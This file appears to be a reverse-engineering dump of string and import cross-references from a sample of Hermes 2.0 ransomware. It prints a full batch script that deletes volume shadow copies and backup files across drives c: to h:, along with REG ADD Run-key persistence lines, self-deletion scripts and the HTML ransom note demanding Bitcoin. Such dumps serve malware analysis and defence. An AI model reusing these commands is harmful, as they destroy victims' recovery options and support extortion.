reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x402709	0x40e014	import	0x4024dc	ADVAPI32.dll.CryptExportKey
0x402740	0x40e054	import	0x4024dc	KERNEL32.dll.CloseHandle
0x40289c	0x4100ec	string	0x402842	\UNIQUE_ID_DO_NOT_REMOVE
0x4028e2	0x410120	string	0x402842	UNIQUE_ID_DO_NOT_REMOVE
0x4028ea	0x40e024	import	0x402842	KERNEL32.dll.CopyFileW
0x402953	0x410150	string	0x402842	\DECRYPT_INFORMATION.html
0x4029fb	0x410184	string	0x4029a4	SystemDrive
0x402a59	0x410190	string	0x4029a4	winlogon.exe
0x402a6d	0x4101a0	string	0x4029a4	desktop.bat
0x402aa6	0x4101ac	string	0x4029a4	\Documents and Settings\All Users\
0x402abe	0x4101d0	string	0x4029a4	\users\Public\
0x402baa	0x4101e0	string	0x4029a4	chcp 1252\r\n@echo off\r\ndel "
0x402bb9	0x4101fc	string	0x4029a4	@echo off\r\ndel "
0x402c08	0x410210	string	0x4029a4	"\r\ndel %0
0x402f49	0x410270	string	0x402f0f	C:\Eleven\Comet.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
0x402f8a	0x4102e0	string	0x402f0f	\Microsoft
0x402fb4	0x4102f8	string	0x402f0f	\Windows
0x402fea	0x41030c	string	0x402f0f	\Start Menu
0x403015	0x410324	string	0x402f0f	\Programs
0x403040	0x410338	string	0x402f0f	\Administrative Tools
0x4030b1	0x410368	string	0x403061	C:\Eleven\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Computer Management.lnk
0x40310e	0x410424	string	0x4030fb	Environment
0x403142	0x41043c	string	0x4030fb	ProgramData
0x403176	0x410424	string	0x403165	Environment
0x40318a	0x41043c	string	0x403165	ProgramData
0x4031b3	0x40e048	import	0x403165	KERNEL32.dll.RemoveDirectoryW
0x403215	0x410454	string	0x4031bd	shade.bat
0x403233	0x410468	string	0x4031bd	vssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\r\ndel /s /f /q c:*.VHD c:*.bac c:*.bak c:*.wbcat c:*.bkf c:Backup*.* c:\backup*.* c:*.set c:*.win c:*.dsk\r\ndel /s /f /q d:*.VHD d:*.bac d:*.bak d:*.wbcat d:*.bkf d:Backup*.* d:\backup*.* d:*.set d:*.win d:*.dsk\r\ndel /s /f /q e:*.VHD e:*.bac e:*.bak e:*.wbcat e:*.bkf e:Backup*.* e:\backup*.* e:*.set e:*.win e:*.dsk\r\ndel /s /f /q f:*.VHD f:*.bac f:*.bak f:*.wbcat f:*.bkf f:Backup*.* f:\backup*.* f:*.set f:*.win f:*.dsk\r\ndel /s /f /q g:*.VHD g:*.bac g:*.bak g:*.wbcat g:*.bkf g:Backup*.* g:\backup*.* g:*.set g:*.win g:*.dsk\r\ndel /s /f /q h:*.VHD h:*.bac h:*.bak h:*.wbcat h:*.bkf h:Backup*.* h:\backup*.* h:*.set h:*.win h:*.dsk\r\ndel %0
0x403278	0x40e020	import	0x4031bd	KERNEL32.dll.Sleep
0x403356	0x410a20	string	0x4031bd	WScript.CreateObject("WScript.Shell").Run "
0x40336f	0x410a78	string	0x4031bd	", 0 , false\r\n
0x40337e	0x410a98	string	0x4031bd	Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True
0x4034b8	0x410270	string	0x4031bd	C:\Eleven\Comet.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
0x4034f0	0x410b64	string	0x4031bd	Manage
0x40355b	0x410b74	string	0x403535	SystemDrive
0x4035ca	0x410b90	string	0x403535	\Documents and Settings\All Users\
0x4035e6	0x410bd8	string	0x403535	\users\Public\
0x403624	0x410184	string	0x4035fa	SystemDrive
0x4036ab	0x410bf8	string	0x4035fa	\Documents and Settings\
0x4036c4	0x410c14	string	0x4035fa	\users\
0x403707	0x410c1c	string	0x4035fa	\Desktop
0x403766	0x410c28	string	0x4035fa	\DECRYPT_INFORMATION.html
0x403797	0x413d48	string	0x4035fa	<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>HERMES RANSOMWARE</title><style type="text/css">body {\tmin-width: 100px;}#container{background:#1E90FF;}#container .column{position:relative; float:center;}#center{padding:10px 10px;width:100%;}#footer{clear:both;}* html #left {left:150px;}* html body{overflow:hidden;}* html #footer-wrapper{float:left;position: relative;width: 100%;padding-bottom:10010px;margin-bottom:-10000px;background:#1E90FF;}body {margin: 0;padding: 0;font-family:tahoma;font-weight:bold;}#header {font-family:tahoma;font-weight:bold;padding: 1.0em;background: #E6E6FA;}#footer {font-size: large;font-family:impact;line-height: 0.1px;padding: 1.0em;background: #E6E6FA;}#center {background: #1E90FF;}</style></head><body style="background-color:#E6E6FA;"><header id="header"><font size="6" color="#1E90FF"><p align="center">HERMES <font color="EE0000">2.0</font> RANSOMWARE</p></font></header><div id="container"><main id="center" class="column"><article><h1 align="center"><font color="EE0000" size ="6"><p align="center">All your important files are encrypted</p></font></h1><font color="#E6E6FA" size="4" weight="lighter"><p align="center">Your files has been encrypted using RSA2048 algorithm with unique public-key stored on your PC.</p><p align="center">There is&nbsp;&nbsp;only one way&nbsp;&nbsp; to get your files back:&nbsp;&nbsp;contact with us,&nbsp;&nbsp;pay,&nbsp;&nbsp;and get &nbsp;<font color="#00FF00">decryptor software.</font>&nbsp;</p><p align="center">You have "UNIQUE_ID_DO_NOT_REMOVE" file on your desktop also it duplicated in some folders,</p><p align="center">its your unique idkey, attach it to letter when contact with us. Also you can decrypt 3 files for test.</p><p align="center">We accept Bitcoin, &nbsp;you can find exchangers on <a href>https://www.bitcoin.com/buy-bitcoin<a>&nbsp;&nbsp;and others.</p><p align="center"><font color="#00FF00" size="4"> </font></p><font size="4"><p align="center">Contact information:</p><p align="ce
0x4037c3	0x410c48	string	0x4035fa	REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "allkeeper" /t REG_SZ /d "
0x403816	0x410cb0	string	0x4035fa	" /f
0x403831	0x410cb8	string	0x4035fa	/reg:64
0x403841	0x40e050	import	0x4035fa	KERNEL32.dll.WinExec
0x40384c	0x40e020	import	0x4035fa	KERNEL32.dll.Sleep
0x403876	0x410cc4	string	0x40386a	kernel32
0x403881	0x410cd0	string	0x40386a	IsWow64Process
0x4038a5	0x40e068	import	0x40386a	KERNEL32.dll.GetCurrentProcess
0x4038cf	0x40397e	string	0x4038b5	9]\buEj
0x4038eb	0x410ce0	string	0x4038b5	REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "sysrep" /t REG_SZ /d "
0x40394d	0x410cb0	string	0x4038b5	" /f
0x403968	0x410cb8	string	0x4038b5	/reg:64
0x403978	0x40e050	import	0x4038b5	KERNEL32.dll.WinExec
0x403986	0x410d48	string	0x4038b5	REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "sysrep" /f
0x4039b2	0x410cb8	string	0x4038b5	/reg:64
0x4039c2	0x40e050	import	0x4038b5	KERNEL32.dll.WinExec
0x4039f1	0x410da4	string	0x4039cf	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
0x403a12	0x410dd4	string	0x4039cf	sysrep
0x403a3a	0x410ddc	string	0x4039cf	SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\
0x403a62	0x410e18	string	0x4039cf	EnableLUA
0x403b7a	0x410e28	string	0x403b6c	qewvrnblkrentbklrwmetklevrmwkrlefmc1ldmfklwvejbrtklejwfdpoeberbntntbynusfdvf
0x403cd5	0x413d48	string	0x403b6c	<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>HERMES RANSOMWARE</title><style type="text/css">body {\tmin-width: 100px;}#container{background:#1E90FF;}#container .column{position:relative; float:center;}#center{padding:10px 10px;width:100%;}#footer{clear:both;}* html #left {left:150px;}* html body{overflow:hidden;}* html #footer-wrapper{float:left;position: relative;width: 100%;padding-bottom:10010px;margin-bottom:-10000px;background:#1E90FF;}body {margin: 0;padding: 0;font-family:tahoma;font-weight:bold;}#header {font-family:tahoma;font-weight:bold;padding: 1.0em;background: #E6E6FA;}#footer {font-size: large;font-family:impact;line-height: 0.1px;padding: 1.0em;background: #E6E6FA;}#center {background: #1E90FF;}</style></head><body style="background-color:#E6E6FA;"><header id="header"><font size="6" color="#1E90FF"><p align="center">HERMES <font color="EE0000">2.0</font> RANSOMWARE</p></font></header><div id="container"><main id="center" class="column"><article><h1 align="center"><font color="EE0000" size ="6"><p align="center">All your important files are encrypted</p></font></h1><font color="#E6E6FA" size="4" weight="lighter"><p align="center">Your files has been encrypted using RSA2048 algorithm with unique public-key stored on your PC.</p><p align="center">There is&nbsp;&nbsp;only one way&nbsp;&nbsp; to get your files back:&nbsp;&nbsp;contact with us,&nbsp;&nbsp;pay,&nbsp;&nbsp;and get &nbsp;<font color="#00FF00">decryptor software.</font>&nbsp;</p><p align="center">You have "UNIQUE_ID_DO_NOT_REMOVE" file on your desktop also it duplicated in some folders,</p><p align="center">its your unique idkey, attach it to letter when contact with us. Also you can decrypt 3 files for test.</p><p align="center">We accept Bitcoin, &nbsp;you can find exchangers on <a href>https://www.bitcoin.com/buy-bitcoin<a>&nbsp;&nbsp;and others.</p><p align="center"><font color="#00FF00" size="4"> </font></p><font size="4"><p align="center">Contact information:</p><p align="ce
0x403ce0	0x414c88	string	0x403b6c	</font></p> <p align = "center">reserve email: <font color = "#00FF00">
0x403d18	0x414cd8	string	0x403b6c	</font></font></font></article></main></div> <div id = "footer-wrapper"><footer id="footer"><header id="header"><font size="1" color="#1E90FF"></font></header></footer></div><audio autoplay preload="auto" style=" width:1px; "><source src="http:////mp3-crazy.net//dl//YyXhnf6wQaFl9yleshVGqw//1488626267//download_music//2015//06//vivaldi-vremena-goda-vesna-allegro-(mp3-crazy.net).mp3" type="audio/mpeg"></audio><br/></body></html>
0x403d56	0x40e058	import	0x403d49	KERNEL32.dll.GetSystemTime
0x403d80	0x410e78	string	0x403d49	SYSTEM\CurrentControlSet\Control\Nls\Language\
0x403da5	0x410ea8	string	0x403d49	InstallLanguage
0x403dba	0x410eb8	string	0x403d49	0419
0x403dce	0x410ec0	string	0x403d49	0422
0x403de2	0x410ec8	string	0x403d49	0423
0x4043e0	0x4043e4	string	0x4043c9	9U\br
0x40458d	0x404591	string	0x404576	9U\br
0x404958	0x40e1e8	string	0x40494c	string too long
0x404990	0x40e1f8	string	0x404984	invalid string position
0x404c60	0x406eac	string	0x404c25	j\fh(
0x404d64	0x40e080	import	0x404cac	KERNEL32.dll.MultiByteToWideChar
0x404d79	0x40e07c	import	0x404cac	KERNEL32.dll.GetLastError
0x404e15	0x40e080	import	0x404cac	KERNEL32.dll.MultiByteToWideChar
0x404f72	0x40e21c	string	0x404f55	Unknown exception
0x4050e9	0x4050f8	string	0x4050c0	^[_3
0x405231	0x40e090	import	0x405155	KERNEL32.dll.IsDebuggerPresent
0x40523b	0x40e08c	import	0x405155	KERNEL32.dll.SetUnhandledExceptionFilter
0x405248	0x40e088	import	0x405155	KERNEL32.dll.UnhandledExceptionFilter
0x405263	0x40e068	import	0x405155	KERNEL32.dll.GetCurrentProcess
0x40526a	0x40e084	import	0x405155	KERNEL32.dll.TerminateProcess
0x405276	0x4060cd	string	0x405155	;\r`9A
0x4052b6	0x4052fc	string	0x4052a3	_[]Ë blocks=Basic Latin,Latin-1 Supplement
0x4056b3	0x40e020	import	0x4056a7	KERNEL32.dll.Sleep
0x4056bc	0x40e094	import	0x4056a7	KERNEL32.dll.GetModuleHandleW
0x405705	0x40e248	string	0x405700	mscoree.dll
0x40570a	0x40e094	import	0x405700	KERNEL32.dll.GetModuleHandleW
0x405714	0x40e238	string	0x405700	CorExitProcess
0x40571a	0x40e03c	import	0x405700	KERNEL32.dll.GetProcAddress
0x40573c	0x40e098	import	0x40572b	KERNEL32.dll.ExitProcess
0x40575d	0x40576a	string	0x405755	;u\br
0x40577d	0x40578e	string	0x405772	;u\fr
0x405a9d	0x40e09c	import	0x405a5f	KERNEL32.dll.GetStartupInfoW
0x405b82	0x405b8a	string	0x405a5f	j\nYQPVh
0x405cdd	0x40e0a0	import	0x405c9b	KERNEL32.dll.RaiseException
0x405db9	0x4060cd	string	0x405dac	;\r`9A
0x405ec5	0x4060cd	string	0x405eb6	;\r`9A
0x405f17	0x405f24	string	0x405eb6	jjjjj
0x405f71	0x409149	string	0x405f53	j\bhx
0x405fb6	0x409149	string	0x405f53	j\bhx
0x4065ce	0x40e0a8	import	0x4065ad	KERNEL32.dll.GetCPInfo
0x406739	0x4060cd	string	0x4065ad	;\r`9A
0x40680d	0x40e0b8	import	0x4067e4	KERNEL32.dll.GetOEMCP
0x406830	0x40e0b4	import	0x4067e4	KERNEL32.dll.GetACP
0x4068d3	0x40e0bc	import	0x406860	KERNEL32.dll.IsValidCodePage
0x4068e6	0x40e0a8	import	0x406860	KERNEL32.dll.GetCPInfo
0x4068ee	0x406a27	string	0x406860	95TuA
0x406a3e	0x4060cd	string	0x406860	;\r`9A
0x406abb	0x40e0b0	import	0x406a45	KERNEL32.dll.InterlockedDecrement
0x406ada	0x40e0ac	import	0x406a45	KERNEL32.dll.InterlockedIncrement
0x406b72	0x40e0b0	import	0x406a45	KERNEL32.dll.InterlockedDecrement
0x406d4d	0x40e0ac	import	0x406d46	KERNEL32.dll.InterlockedIncrement
0x406de8	0x40e0b0	import	0x406dd5	KERNEL32.dll.InterlockedDecrement
0x406f2e	0x40e0c0	import	0x406f22	KERNEL32.dll.TlsGetValue
0x406f5b	0x40e314	string	0x406f22	KERNEL32.DLL
0x406f61	0x40e094	import	0x406f22	KERNEL32.dll.GetModuleHandleW
0x406f76	0x40e304	string	0x406f22	EncodePointer
0x406f7c	0x40e03c	import	0x406f22	KERNEL32.dll.GetProcAddress
0x406fa9	0x40e0c0	import	0x406f9d	KERNEL32.dll.TlsGetValue
0x406fd6	0x40e314	string	0x406f9d	KERNEL32.DLL
0x406fdc	0x40e094	import	0x406f9d	KERNEL32.dll.GetModuleHandleW
0x406ff1	0x40e330	string	0x406f9d	DecodePointer
0x406ff7	0x40e03c	import	0x406f9d	KERNEL32.dll.GetProcAddress
0x40700f	0x40e0c4	import	0x406f9d	KERNEL32.dll.TlsAlloc
0x407021	0x40e0c0	import	0x407018	KERNEL32.dll.TlsGetValue
0x407042	0x40e0c8	import	0x407018	KERNEL32.dll.TlsSetValue
0x407077	0x40e0cc	import	0x40704c	KERNEL32.dll.TlsFree
0x407095	0x40e314	string	0x407089	KERNEL32.DLL
0x40709b	0x40e094	import	0x407089	KERNEL32.dll.GetModuleHandleW
0x4070c3	0x40e304	string	0x407089	EncodePointer
0x4070c9	0x40e03c	import	0x407089	KERNEL32.dll.GetProcAddress
0x4070d7	0x40e330	string	0x407089	DecodePointer
0x40710e	0x40e0ac	import	0x407089	KERNEL32.dll.InterlockedIncrement
0x407174	0x40e07c	import	0x407170	KERNEL32.dll.GetLastError
0x4071bf	0x407089	string	0x407170	j\fhH
0x4071c6	0x40e0d4	import	0x407170	KERNEL32.dll.GetCurrentThreadId
0x4071de	0x40e0d0	import	0x407170	KERNEL32.dll.SetLastError
0x4072a1	0x40e0b0	import	0x4071e9	KERNEL32.dll.InterlockedDecrement
0x407336	0x40e314	string	0x407332	KERNEL32.DLL
0x40733c	0x40e094	import	0x407332	KERNEL32.dll.GetModuleHandleW
0x407357	0x40e03c	import	0x407332	KERNEL32.dll.GetProcAddress
0x40735d	0x40e360	string	0x407332	FlsAlloc
0x407365	0x40e354	string	0x407332	FlsGetValue
0x407372	0x40e348	string	0x407332	FlsSetValue
0x40737f	0x40e340	string	0x407332	FlsFree
0x407393	0x40e0c8	import	0x407332	KERNEL32.dll.TlsSetValue
0x4073da	0x40e0c4	import	0x407332	KERNEL32.dll.TlsAlloc
0x407450	0x407203	string	0x407332	j\bhp
0x40749d	0x407089	string	0x407332	j\fhH
0x4074a4	0x40e0d4	import	0x407332	KERNEL32.dll.GetCurrentThreadId
0x407528	0x40755a	string	0x4074f7	_^[]
0x4075c2	0x40e0d8	import	0x4075ae	KERNEL32.dll.HeapAlloc
0x4076e0	0x40e0dc	import	0x4076ce	KERNEL32.dll.HeapFree
0x4076f1	0x40e07c	import	0x4076ce	KERNEL32.dll.GetLastError
0x407714	0x40771d	string	0x407706	9]\bu"
0x40787e	0x4078e9	string	0x407849	_[]Ë blocks=Basic Latin,Latin-1 Supplement
0x4078d5	0x4078e9	string	0x407849	_[]Ë blocks=Basic Latin,Latin-1 Supplement
0x407922	0x40e080	import	0x407907	KERNEL32.dll.MultiByteToWideChar
0x407a6f	0x40e0e4	import	0x407a6c	KERNEL32.dll.GetEnvironmentStringsW
0x407a8b	0x407a86	string	0x407a6c	@@f9\bu
0x407a92	0x407a86	string	0x407a6c	@@f9\bu
0x407aaa	0x40e0e0	import	0x407a6c	KERNEL32.dll.FreeEnvironmentStringsW
0x407b47	0x40c283	string	0x407b32	j\fhX
